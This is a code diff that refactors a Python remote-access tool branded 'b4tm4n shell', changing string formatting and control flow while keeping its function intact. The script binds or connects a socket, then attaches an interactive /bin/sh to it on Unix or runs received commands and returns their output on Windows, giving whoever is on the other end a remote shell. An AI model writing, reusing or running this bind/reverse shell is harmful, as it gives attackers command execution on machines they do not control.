@@ -9,7 +9,9 @@ def shell(c):
 def action(c):
 	if os.name!="nt":
 		f=c.fileno()
-		os.system("export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i <&"+str(f)+" >&"+str(f)+" 2>&"+str(f))
+		os.system(
+			f"export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i <&{str(f)} >&{str(f)} 2>&{str(f)}"
+		)
 	else:
 		while True:
 			try:
@@ -17,16 +19,15 @@ def action(c):
 			except:
 				pass
 			else:
-				if len(r)>0:
-					b=re.search("cd\ ([^\s]+)",r,flags=re.IGNORECASE)
-					if b:
-						if os.path.isdir(b.group(1)):
-							os.chdir(b.group(1))
-						c.send(prompt().encode('utf-8'))
-					else:
-						out=shell(r)
-						if out and len(out)>0:c.send(out)
-				else: return False
+				if len(r) <= 0:
+					return False
+				if b := re.search("cd\ ([^\s]+)", r, flags=re.IGNORECASE):
+					if os.path.isdir(b[1]):
+						os.chdir(b[1])
+					c.send(prompt().encode('utf-8'))
+				else:
+					out=shell(r)
+					if out and len(out)>0:c.send(out)
 
 def prompt():
 	return "\n"+os.getcwd()+">"
@@ -50,7 +51,7 @@ if len(g)==2:
 		if os.name!="nt":
 			c.send(("b4tm4n shell : connected\n").encode('utf-8'))
 		else:
-			c.send(("b4tm4n shell : connected"+prompt()).encode('utf-8'))
+			c.send(f"b4tm4n shell : connected{prompt()}".encode('utf-8'))
 		action(c)
 if len(g)==3:
 	try: s.connect((h,p))
@@ -60,5 +61,5 @@ if len(g)==3:
 		if os.name!="nt":
 			s.send(("b4tm4n shell : connected\n").encode('utf-8'))
 		else:
-			s.send(("b4tm4n shell : connected"+prompt()).encode('utf-8'))
+			s.send(f"b4tm4n shell : connected{prompt()}".encode('utf-8'))
 		action(s)
